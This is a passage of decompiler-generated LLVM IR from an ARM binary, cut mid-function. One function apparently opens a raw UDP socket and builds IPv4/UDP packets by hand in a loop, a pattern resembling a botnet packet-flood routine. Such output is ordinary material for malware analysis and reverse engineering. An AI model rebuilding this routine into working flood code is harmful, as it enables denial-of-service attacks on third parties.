  %v3_b734 = call i32 @function_113cc(i32 %v4_b72c, i32 %v0_b728, i32 16)
  %v0_b73c = load i32, i32* @sb, align 4
  %v1_b73c = load i32, i32* @r7, align 4
  %v9_b73c = icmp eq i32 %v0_b73c, %v1_b73c
  %v1_b740 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b740, i32* %r3.global-to-local, align 4
  br i1 %v9_b73c, label %dec_label_pc_b7f4, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b6bc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6bc ], [ %v1_b740, %dec_label_pc_b724 ]
  store i32 65535, i32* @r4, align 4
  %v2_b75c = call i32 @function_1214c(i32 65535, i32 1)
  store i32 %v5_b76c, i32* %r3.global-to-local, align 4
  %v1_b778 = load i32, i32* @r4, align 4
  %v9_b778 = icmp eq i32 %v3_b61c, %v1_b778
  %v1_b77c = load i32, i32* @fp, align 4
  %v2_b77c = add i32 %v1_b77c, %arg2
  store i32 %v2_b77c, i32* @r6, align 4
  %v2_b780 = load i32, i32* @sl, align 4
  %v3_b780 = add i32 %v2_b780, %stack_var_-60.0
  %v4_b780 = inttoptr i32 %v3_b780 to i32*
  store i32 %v2_b75c, i32* %v4_b780, align 4
  br i1 %v9_b778, label %dec_label_pc_b78c, label %bb51

bb51:                                             ; preds = %dec_label_pc_b74c
  %v1_b784 = load i32, i32* %r3.global-to-local, align 4
  %v2_b784 = trunc i32 %v1_b784 to i16
  %v3_b784 = load i32, i32* @r6, align 4
  %v4_b784 = add i32 %v3_b784, 2
  %v5_b784 = inttoptr i32 %v4_b784 to i16*
  store i16 %v2_b784, i16* %v5_b784, align 2
  br label %dec_label_pc_b6cc

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b74c
  %v0_b78c = call i32 @function_e0b4()
  %v1_b78c = trunc i32 %v0_b78c to i16
  %v0_b794 = load i32, i32* @fp, align 4
  %v2_b794 = add i32 %v0_b794, %arg2
  store i32 %v2_b794, i32* @r6, align 4
  %v4_b798 = add i32 %v2_b794, 2
  %v5_b798 = inttoptr i32 %v4_b798 to i16*
  store i16 %v1_b78c, i16* %v5_b798, align 2
  br label %dec_label_pc_b6cc

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b6fc
  %v1_b7a0 = add i32 %v0_b718, 16
  %v2_b7a0 = inttoptr i32 %v1_b7a0 to i32*
  %v3_b7a0 = load i32, i32* %v2_b7a0, align 4
  store i32 %v3_b7a0, i32* %r4.global-to-local, align 4
  %v0_b7a4 = call i32 @function_e0b4()
  %v1_b7b4 = and i32 %v3_b7a0, 65280
  store i32 %v1_b7b4, i32* %r3.global-to-local, align 4
  %v0_b7bc = load i32, i32* @r6, align 4
  %v1_b7bc = add i32 %v0_b7bc, 20
  %v2_b7bc = inttoptr i32 %v1_b7bc to i8*
  %v3_b7bc = load i8, i8* %v2_b7bc, align 1
  %v4_b7bc = zext i8 %v3_b7bc to i32
  %v5_b7c0 = call i32 @llvm.bswap.i32(i32 %v3_b7a0)
  %v7_b7c4 = lshr i32 %v0_b7a4, %v4_b7bc
  %v8_b7c4 = add i32 %v7_b7c4, %v5_b7c0
  %v5_b7dc = call i32 @llvm.bswap.i32(i32 %v8_b7c4)
  store i32 %v5_b7dc, i32* %r3.global-to-local, align 4
  %v2_b7e0 = add i32 %v0_b7bc, 4
  %v3_b7e0 = inttoptr i32 %v2_b7e0 to i32*
  store i32 %v5_b7dc, i32* %v3_b7e0, align 4
  %v0_b728.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b724

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b6cc
  store i32 %v3_b5c8, i32* %r4.global-to-local, align 4
  store i32 %v18_b5c8, i32* %sb.global-to-local, align 4
  ret i32 %v3_b6d8

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b6b4
  %v1_b83422 = phi i32 [ 0, %dec_label_pc_b6b4 ], [ %v0_b73c, %dec_label_pc_b724 ]
  %v2_b7f8 = icmp eq i32 %v0_b69810, 0
  br i1 %v2_b7f8, label %dec_label_pc_b818.outer, label %dec_label_pc_b830

dec_label_pc_b808:                                ; preds = %dec_label_pc_b818
  store i32 %v1_b80c, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b808 = load i32, i32* @r8, align 4
  %v4_b808 = mul i32 %v1_b80c, 4
  %v5_b808 = add i32 %v0_b808, %v4_b808
  %v6_b808 = inttoptr i32 %v5_b808 to i32*
  %v7_b808 = load i32, i32* %v6_b808, align 4
  %v0_b80c = load i32, i32* @sl, align 4
  %v5_b80c = add i32 %v0_b80c, %v4_b808
  %v6_b80c = inttoptr i32 %v5_b80c to i32*
  %v7_b80c = load i32, i32* %v6_b80c, align 4
  %v4_b810 = call i32 @function_11528(i32 %v7_b808, i32 %v7_b80c, i32 %v0_b81c, i32 16384)
  %v0_b814 = load i32, i32* %r4.global-to-local, align 4
  %v1_b814 = add i32 %v0_b814, 1
  %v0_b818.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b818.outer

dec_label_pc_b818.outer:                          ; preds = %dec_label_pc_b7f4, %dec_label_pc_b808
  %v0_b818.ph = phi i32 [ %v0_b818.pre.pre, %dec_label_pc_b808 ], [ %v1_b83422, %dec_label_pc_b7f4 ]
  %v1_b80c.ph = phi i32 [ %v1_b814, %dec_label_pc_b808 ], [ 0, %dec_label_pc_b7f4 ]
  %v0_b81c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b818

dec_label_pc_b818:                                ; preds = %dec_label_pc_b818.outer, %dec_label_pc_b818
  %v1_b80c = phi i32 [ 0, %dec_label_pc_b818 ], [ %v1_b80c.ph, %dec_label_pc_b818.outer ]
  %v8_b824 = icmp sgt i32 %v0_b818.ph, %v1_b80c
  br i1 %v8_b824, label %dec_label_pc_b808, label %dec_label_pc_b818

dec_label_pc_b830:                                ; preds = %dec_label_pc_b834, %dec_label_pc_b7f4
  %v1_b83421 = phi i32 [ %v1_b83422, %dec_label_pc_b7f4 ], [ %v1_b834, %dec_label_pc_b834 ]
  br label %dec_label_pc_b834

dec_label_pc_b834:                                ; preds = %dec_label_pc_b840, %dec_label_pc_b830
  %v1_b834 = phi i32 [ %v1_b83421, %dec_label_pc_b830 ], [ %v1_b834.pre, %dec_label_pc_b840 ]
  %v1_b840 = phi i32 [ 0, %dec_label_pc_b830 ], [ %v1_b860, %dec_label_pc_b840 ]
  store i32 %v1_b840, i32* @r6, align 4
  %v6_b83c = icmp slt i32 %v1_b840, %v1_b834
  br i1 %v6_b83c, label %dec_label_pc_b840, label %dec_label_pc_b830

dec_label_pc_b840:                                ; preds = %dec_label_pc_b834
  %v0_b838 = load i32, i32* @r5, align 4
  %v0_b840 = load i32, i32* @sl, align 4
  %v4_b840 = mul i32 %v1_b840, 4
  %v5_b840 = add i32 %v0_b840, %v4_b840
  %v6_b840 = inttoptr i32 %v5_b840 to i32*
  %v7_b840 = load i32, i32* %v6_b840, align 4
  store i32 %v7_b840, i32* @r4, align 4
  %v2_b848 = inttoptr i32 %v7_b840 to i16*
  %v3_b848 = call i32 @function_e248(i16* %v2_b848, i32 %v0_b838)
  %v0_b84c = load i32, i32* @r8, align 4
  %v1_b84c = load i32, i32* @r6, align 4
  %v4_b84c = mul i32 %v1_b84c, 4
  %v5_b84c = add i32 %v4_b84c, %v0_b84c
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v0_b850 = load i32, i32* @r4, align 4
  %v0_b854 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b85c = call i32 @function_11528(i32 %v7_b84c, i32 %v0_b850, i32 %v0_b854, i32 16384)
  %v0_b860 = load i32, i32* @r6, align 4
  %v1_b860 = add i32 %v0_b860, 1
  %v1_b834.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b834

; uselistorder directives
  uselistorder i32 %v1_b834, { 1, 0 }
  uselistorder i32 %v1_b80c, { 2, 1, 0 }
  uselistorder i32 %v5_b7dc, { 1, 0 }
  uselistorder i32 %v3_b7a0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b718, { 1, 0, 2 }
  uselistorder i32 %v3_b6d8, { 1, 3, 2, 0 }
  uselistorder i32 %v3_b66c, { 1, 0 }
  uselistorder i32 %v3_b61c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b818, { 1, 0 }
  uselistorder label %dec_label_pc_b818.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
  uselistorder label %dec_label_pc_b6cc, { 1, 0 }
  uselistorder label %dec_label_pc_b6b4, { 1, 0 }
}

define i32 @function_b868(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b868:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b868 = load i32, i32* @sb, align 4
  %v27_b868 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b884 = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_b888 = load i32, i32* @r5, align 4
  store i32 %v0_b888, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b898 = load i32, i32* @r4, align 4
  store i32 %v0_b898, i32* %r0.global-to-local, align 4
  %v5_b89c = inttoptr i32 %v0_b888 to i32*
  %v6_b89c = call i32 @function_8570(i32 %v0_b898, i32* %v5_b89c, i32 2, i32 0, i32 %v2_b884)
  %v1_b8a8 = urem i32 %v6_b89c, 256
  store i32 %v1_b8a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8b4 = load i32, i32* @r5, align 4
  store i32 %v0_b8b4, i32* %r1.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r4, align 4
  store i32 %v0_b8b8, i32* %r0.global-to-local, align 4
  %v5_b8bc = trunc i32 %v6_b89c to i8
  %v6_b8c0 = inttoptr i32 %v0_b8b4 to i32*
  %v7_b8c0 = call i32 @function_8570(i32 %v0_b8b8, i32* %v6_b8c0, i32 3, i32 65535, i32 %v6_b89c)
  %v0_b8c4 = load i32, i32* @r5, align 4
  store i32 %v0_b8c4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b8d4 = load i32, i32* @r4, align 4
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  %v5_b8d8 = inttoptr i32 %v0_b8c4 to i32*
  %v6_b8d8 = call i32 @function_8570(i32 %v0_b8d4, i32* %v5_b8d8, i32 4, i32 64, i32 %v7_b8c0)
  %v1_b8e0 = urem i32 %v6_b8d8, 256
  store i32 %v1_b8e0, i32* %ip.global-to-local, align 4
  %v0_b8e4 = load i32, i32* @r5, align 4
  store i32 %v0_b8e4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8f0 = load i32, i32* @r4, align 4
  store i32 %v0_b8f0, i32* %r0.global-to-local, align 4
  %v6_b8f8 = inttoptr i32 %v0_b8e4 to i32*
  %v7_b8f8 = call i32 @function_8570(i32 %v0_b8f0, i32* %v6_b8f8, i32 5, i32 0, i32 %v1_b8e0)
  %v1_b904 = urem i32 %v7_b8f8, 256
  store i32 %v1_b904, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b910 = load i32, i32* @r5, align 4
  store i32 %v0_b910, i32* %r1.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b91c = inttoptr i32 %v0_b910 to i32*
  %v6_b91c = call i32 @function_8570(i32 %v0_b914, i32* %v5_b91c, i32 6, i32 65535, i32 %v1_b904)
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b91c, i32* %sb.global-to-local, align 4
  %v0_b934 = load i32, i32* @r4, align 4
  store i32 %v0_b934, i32* %r0.global-to-local, align 4
  %v5_b938 = inttoptr i32 %v0_b924 to i32*
  %v6_b938 = call i32 @function_8570(i32 %v0_b934, i32* %v5_b938, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b93c = load i32, i32* @r5, align 4
  store i32 %v0_b93c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b938, i32* @sl, align 4
  %v0_b94c = load i32, i32* @r4, align 4
  store i32 %v0_b94c, i32* %r0.global-to-local, align 4
  %v5_b950 = inttoptr i32 %v0_b93c to i32*
  %v6_b950 = call i32 @function_8570(i32 %v0_b94c, i32* %v5_b950, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b95c = load i32, i32* @r5, align 4
  store i32 %v0_b95c, i32* %r1.global-to-local, align 4
  store i32 %v6_b950, i32* @r6, align 4
  %v0_b964 = load i32, i32* @r4, align 4
  store i32 %v0_b964, i32* %r0.global-to-local, align 4
  %v5_b968 = inttoptr i32 %v0_b95c to i32*
  %v6_b968 = call i32 @function_8570(i32 %v0_b964, i32* %v5_b968, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b974 = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_b974, i32* %r3.global-to-local, align 4
  %v1_b978 = urem i32 %v6_b968, 256
  store i32 %v1_b978, i32* %ip.global-to-local, align 4
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b984 = load i32, i32* @r4, align 4
  store i32 %v0_b984, i32* %r0.global-to-local, align 4
  %v5_b98c = inttoptr i32 %v0_b97c to i32*
  %v6_b98c = call i32 @function_8570(i32 %v0_b984, i32* %v5_b98c, i32 25, i32 %v2_b974, i32 %v1_b978)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9a0 = call i32 @function_115e4(i32 2, i32 3, i32 17)
  store i32 %v3_b9a0, i32* %r0.global-to-local, align 4
  %v7_b9a4 = icmp eq i32 %v3_b9a0, -1
  store i1 %v7_b9a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9a0, i32* @fp, align 4
  br i1 %v7_b9a4, label %dec_label_pc_bd44, label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b868
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b9cc = call i32 @function_115a0(i32 %v3_b9a0, i32 0, i32 3, i32 %v6_b9b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b9cc, i32* %r0.global-to-local, align 4
  %v7_b9d0 = icmp eq i32 %v5_b9cc, -1
  store i1 %v7_b9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b9d0, label %dec_label_pc_bd3c, label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9b0
  %v0_b9d8 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_b9e4 = urem i32 %v0_b9d8, 65536
  store i32 %v3_b9e4, i32* %r2.global-to-local, align 4
  %v3_b9e8 = icmp ugt i32 %v3_b9e4, 1459
  %v9_b9e8 = icmp eq i32 %v3_b9e4, 1460
  store i1 %v9_b9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b9e8, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_b9d8
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_b9d8, %bb
  %v0_ba44 = phi i32 [ %v3_b9e4, %dec_label_pc_b9d8 ], [ 1460, %bb ]
  store i32 %v7_b8c0, i32* %r0.global-to-local, align 4
  %v0_b9f4 = load i32, i32* %sb.global-to-local, align 4
  %v3_b9fc = urem i32 %v0_b9f4, 65536
  store i32 %v3_b9fc, i32* %ip.global-to-local, align 4
  %v0_ba00 = load i32, i32* @r7, align 4
  %v2_ba00 = icmp eq i32 %v0_ba00, 0
  store i1 %v2_ba00, i1* %cpsr_z.global-to-local, align 1
  %v0_ba04 = load i32, i32* @sl, align 4
  %v3_ba04 = mul i32 %v0_ba04, 65536
  br i1 %v2_ba00, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba44, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba34 = phi i32 [ %v3_b9fc, %bb48 ], [ %v0_ba44, %bb49 ]
  %v3_ba14 = urem i32 %v0_ba04, 65536
  store i32 %v3_ba14, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba1c = urem i32 %v7_b8c0, 65536
  store i32 %v3_ba1c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba00, label %.thread, label %dec_label_pc_ba3c

.thread:                                          ; preds = %bb50
  %v2_ba30 = add nsw i32 %v1_ba34, 28
  store i32 %v2_ba30, i32* @sb, align 4
  %v2_ba34 = add nsw i32 %v1_ba34, 8
  store i32 %v2_ba34, i32* @sl, align 4
  br label %dec_label_pc_bb60.preheader

dec_label_pc_ba3c:                                ; preds = %bb50
  %v1_ba44 = add nuw nsw i32 %v0_ba44, 28
  store i32 %v1_ba44, i32* @sb, align 4
  %v1_ba48 = add nuw nsw i32 %v0_ba44, 8
  store i32 %v1_ba48, i32* @sl, align 4
  %tmp51 = mul i32 %v0_b9f4, 256
  %v3_ba5c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_b9f4, 256
  %v4_ba6c = urem i32 %tmp52, 256
  %v5_ba6c = or i32 %v4_ba6c, %v3_ba5c
  store i32 %v5_ba6c, i32* @r6, align 4
  store i32 %v3_ba04, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba44, 256
  %v3_ba78 = and i32 %tmp53, 65280
  store i32 %v3_ba78, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba04, 256
  %v3_ba7c = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba48, 256
  %v3_ba80 = and i32 %tmp55, 65280
  store i32 %v3_ba80, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba44, 256
  %v4_ba84 = urem i32 %tmp56, 256
  %v5_ba84 = or i32 %v4_ba84, %v3_ba78
  store i32 %v5_ba84, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba04, 256
  %v4_ba88 = urem i32 %tmp57, 256
  %v5_ba88 = or i32 %v4_ba88, %v3_ba7c
  store i32 %v5_ba88, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba48 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b8c0, 256
  %v3_ba90 = and i32 %tmp58, 65280
  store i32 %v3_ba90, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b8c0, 256
  %v4_baa0 = urem i32 %tmp59, 256
  %v5_baa0 = or i32 %v4_baa0, %v3_ba90
  store i32 %v5_baa0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_ba84, 65536
  %v4_bb14 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_ba88, 65536
  %v7_bb48 = sdiv i32 %sext6, 65536
  %v1_bb08 = trunc i32 %v6_b8d8 to i8
  %v3_bb48 = sext i16 %rev to i32
  br label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %.thread8, %dec_label_pc_ba3c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bab4 = call i32 @function_1214c(i32 1510, i32 1)
  store i32 %v2_bab4, i32* %r0.global-to-local, align 4
  store i32 %v2_b884, i32* %r3.global-to-local, align 4
  %v3_babc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_babc, i32* %r1.global-to-local, align 4
  %v2_bac0 = load i32, i32* @r4, align 4
  %v5_bac0 = mul i32 %v2_bac0, 4
  %v6_bac0 = add i32 %v5_bac0, %v2_b884
  %v7_bac0 = inttoptr i32 %v6_bac0 to i32*
  store i32 %v2_bab4, i32* %v7_bac0, align 4
  %v0_bac4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bac4 = load i32, i32* %r1.global-to-local, align 4
  %v4_bac4 = mul i32 %v1_bac4, 4
  %v5_bac4 = add i32 %v4_bac4, %v0_bac4
  %v6_bac4 = inttoptr i32 %v5_bac4 to i32*
  %v7_bac4 = load i32, i32* %v6_bac4, align 4
  store i32 %v7_bac4, i32* %r0.global-to-local, align 4
  %v1_bac8 = inttoptr i32 %v7_bac4 to i8*
  %v2_bac8 = load i8, i8* %v1_bac8, align 1
  %tmp = urem i8 %v2_bac8, 16
  %v1_bacc = zext i8 %tmp to i32
  %v1_bad0 = or i32 %v1_bacc, 64
  store i32 %v1_bad0, i32* %r3.global-to-local, align 4
  %v1_bad4 = trunc i32 %v1_bad0 to i8
  store i8 %v1_bad4, i8* %v1_bac8, align 1
  %v0_bad8 = load i32, i32* %r0.global-to-local, align 4
  %v1_bad8 = inttoptr i32 %v0_bad8 to i8*
  %v2_bad8 = load i8, i8* %v1_bad8, align 1
  %v1_badc = and i8 %v2_bad8, -16
  %v1_bae0 = or i8 %v1_badc, 5
  store i32 %v1_b904, i32* %ip.global-to-local, align 4
  %v0_bae8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bae8 = mul i32 %v0_bae8, 32
  store i32 %v3_bae8, i32* %r2.global-to-local, align 4
  store i8 %v1_bae0, i8* %v1_bad8, align 1
  %v0_baf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_baf0 = add i32 %v0_baf0, 1
  store i32 %v1_baf0, i32* @r4, align 4
  %v0_baf4 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_baf0, -8
  %v5_baf4 = add i32 %v0_baf4, %tmp61
  store i32 %v5_baf4, i32* %r2.global-to-local, align 4
  store i32 %v6_b89c, i32* %r1.global-to-local, align 4
  %v2_bafc = load i32, i32* %r0.global-to-local, align 4
  %v3_bafc = add i32 %v2_bafc, 1
  %v4_bafc = inttoptr i32 %v3_bafc to i8*
  store i8 %v5_b8bc, i8* %v4_bafc, align 1
  store i32 %v1_b8e0, i32* %r3.global-to-local, align 4
  %v0_bb04 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb04 = icmp eq i32 %v0_bb04, 0
  store i1 %v2_bb04, i1* %cpsr_z.global-to-local, align 1
  %v2_bb08 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb08 = add i32 %v2_bb08, 8
  %v4_bb08 = inttoptr i32 %v3_bb08 to i8*
  store i8 %v1_bb08, i8* %v4_bb08, align 1
  %v0_bb0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb0c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_baa8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb10 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb10 = add i32 %v3_bb10, 6
  %v5_bb10 = inttoptr i32 %v4_bb10 to i16*
  store i16 64, i16* %v5_bb10, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_baa8, %bb60
  store i32 %v4_bb14, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb1c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb1c = add i32 %v2_bb1c, 9
  %v4_bb1c = inttoptr i32 %v3_bb1c to i8*
  store i8 17, i8* %v4_bb1c, align 1
  %v0_bb20 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb20 = trunc i32 %v0_bb20 to i16
  %v2_bb20 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb20 = add i32 %v2_bb20, 2
  %v4_bb20 = inttoptr i32 %v3_bb20 to i16*
  store i16 %v1_bb20, i16* %v4_bb20, align 2
  store i32 %v6_b98c, i32* %ip.global-to-local, align 4
  %v1_bb28 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb28 = add i32 %v1_bb28, 12
  %v3_bb28 = inttoptr i32 %v2_bb28 to i32*
  store i32 %v6_b98c, i32* %v3_bb28, align 4
  %v0_bb2c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb2c = load i32, i32* @r8, align 4
  %v2_bb2c = add i32 %v1_bb2c, %v0_bb2c
  store i32 %v2_bb2c, i32* %r2.global-to-local, align 4
  %v1_bb30 = add i32 %v2_bb2c, 16
  %v2_bb30 = inttoptr i32 %v1_bb30 to i32*
  %v3_bb30 = load i32, i32* %v2_bb30, align 4
  store i32 %v3_bb30, i32* %r3.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r5, align 4
  %v1_bb34 = trunc i32 %v0_bb34 to i16
  %v2_bb34 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb34 = add i32 %v2_bb34, 4
  %v4_bb34 = inttoptr i32 %v3_bb34 to i16*
  store i16 %v1_bb34, i16* %v4_bb34, align 2
  %v0_bb38 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb38 = add i32 %v0_bb38, 20
  store i32 %v1_bb38, i32* %r1.global-to-local, align 4
  %v0_bb3c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb3c = add i32 %v0_bb38, 16
  %v3_bb3c = inttoptr i32 %v2_bb3c to i32*
  store i32 %v0_bb3c, i32* %v3_bb3c, align 4
  %v0_bb40 = load i32, i32* @r6, align 4
  %v1_bb40 = trunc i32 %v0_bb40 to i16
  %v2_bb40 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb40 = add i32 %v2_bb40, 20
  %v4_bb40 = inttoptr i32 %v3_bb40 to i16*
  store i16 %v1_bb40, i16* %v4_bb40, align 2
  store i32 %v3_bb48, i32* %r0.global-to-local, align 4
  store i32 %v7_bb48, i32* %r3.global-to-local, align 4
  %v0_bb4c = load i32, i32* @r4, align 4
  %v1_bb4c = load i32, i32* @r7, align 4
  %v9_bb4c = icmp eq i32 %v0_bb4c, %v1_bb4c
  store i1 %v9_bb4c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb50 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb50 = add i32 %v2_bb50, 4
  %v4_bb50 = inttoptr i32 %v3_bb50 to i16*
  store i16 %rev, i16* %v4_bb50, align 2
  %v0_bb54 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb54 = trunc i32 %v0_bb54 to i16
  %v2_bb54 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb54 = add i32 %v2_bb54, 2
  %v4_bb54 = inttoptr i32 %v3_bb54 to i16*
  store i16 %v1_bb54, i16* %v4_bb54, align 2
  %v0_bb58 = load i32, i32* @r4, align 4
  store i32 %v0_bb58, i32* %stack_var_-44, align 4
  %v5_bb5c = icmp slt i32 %v0_bb4c, %v1_bb4c
  br i1 %v5_bb5c, label %dec_label_pc_baa8, label %dec_label_pc_bb60.preheader.loopexit

dec_label_pc_bb60.preheader.loopexit:             ; preds = %.thread8
  %v0_bb64.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bb60.preheader

dec_label_pc_bb60.preheader:                      ; preds = %.thread, %dec_label_pc_bb60.preheader.loopexit
  %v0_bb64.pre = phi i32 [ %v0_bb64.pre.pre, %dec_label_pc_bb60.preheader.loopexit ], [ 0, %.thread ]
  %v3_bccc = icmp eq i32 %v6_b98c, -1
  %v8_bccc = icmp eq i32 %v6_b98c, -1
  %v3_bce4 = icmp eq i32 %v3_ba1c, 65535
  %v2_bd20 = icmp eq i32 %v1_b978, 0
  br label %dec_label_pc_bb60

dec_label_pc_bb60:                                ; preds = %dec_label_pc_bb60, %dec_label_pc_bc60, %dec_label_pc_bb60.preheader
